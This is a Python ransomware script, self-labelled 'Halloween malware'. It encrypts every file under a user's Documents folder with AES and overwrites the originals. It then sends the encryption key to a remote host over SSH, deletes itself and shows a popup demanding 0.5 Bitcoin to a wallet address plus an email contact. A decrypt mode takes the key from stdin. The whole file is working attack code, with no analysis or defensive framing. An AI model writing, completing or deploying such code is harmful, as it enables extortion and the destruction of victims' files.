#!/usr/bin/env python
from Crypto.Cipher import AES
from Crypto.Util import Counter
from Crypto import Random

import subprocess as sp
import binascii
import argparse
import os, sys, random, argparse, shutil, easygui, time

import discover
import modify
import remote

# -----------------
# GLOBAL VARIABLES
# CHANGE IT TO YOUR NEEDS
# -----------------
startdirs = ['/home/sally/Documents']
HOSTNAME = ""
USERNAME = ""
PASSWORD = ""

def popup():
    popup_msg = easygui.msgbox("""It's Halloween and Jason's back!
    All your documents have been encrypted. If you want to
    recover your files, proceed with transferring 0.5 BitCoin to the wallet
    address 3QDL5FNJJDYkjrCoNDbQZmhp7ZfwowwiRD, then send an email to the
    following account jason_halloween@protonmail.com. Unless this is done
    within the next 24 hours, you'll never recover your files again.
    The clock is ticking...""", title="Jason's back!")
    return popup_msg


def get_parser():
    parser = argparse.ArgumentParser(description="""Halloween malware -
    encrypts recursively all files on: """ + startdirs[0])
    parser.add_argument('-d', '--decrypt', dest='decrypt', help="""receive key
    from stdin [default: no]""",
                        action="store")
    return parser


def post_encrypt():
    for currentDir in startdirs:
        for file in discover.discoverFiles(currentDir,0):
            shutil.copy2(file, file+'.encrypted')
            modify.overwrite_file_inplace(file)


def pre_decrypt():
    for currentDir in startdirs:
        for file in discover.discoverFiles(currentDir,1):
            ext = file.split('.')[-1]
            if ext == 'encrypted':
                os.rename(file, file[:-10])
            else:
                os.remove(file)


def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    decrypt = args['decrypt']

    #Decrypt mode:
    if decrypt:

        # Get key from stdin
        key = binascii.unhexlify(decrypt)

        # TODO: Remove print
        print(binascii.hexlify(key))

        ctr = Counter.new(128)
        crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

        pre_decrypt()

        for currentDir in startdirs:
            for file in discover.discoverFiles(currentDir,0):
                modify.modify_file_inplace(file, crypt.decrypt)

    #Encrypt mode
    else:

        # Generate random 128 bits key
        key = Random.get_random_bytes(16)

        # TODO: Remove print
        print(binascii.hexlify(key))

        ctr = Counter.new(128)
        crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

        for currentDir in startdirs:
            for file in discover.discoverFiles(currentDir,0):
                modify.modify_file_inplace(file, crypt.encrypt)
        post_encrypt()

        # Send key over SSH; Notice hexlify before connect
        remote.connect(HOSTNAME, USERNAME, PASSWORD, str(binascii.hexlify(key)))

        #Self destroy
        self_path = os.path.abspath(__file__)
        sp.call(["/bin/rm", self_path[:-12]])
        #sp.call(["/bin/rm", self_path[:-3]])

        #Popup Message
        popup()

if __name__=="__main__":
    # Go to sleep before action
    #time.sleep(600)
    main()
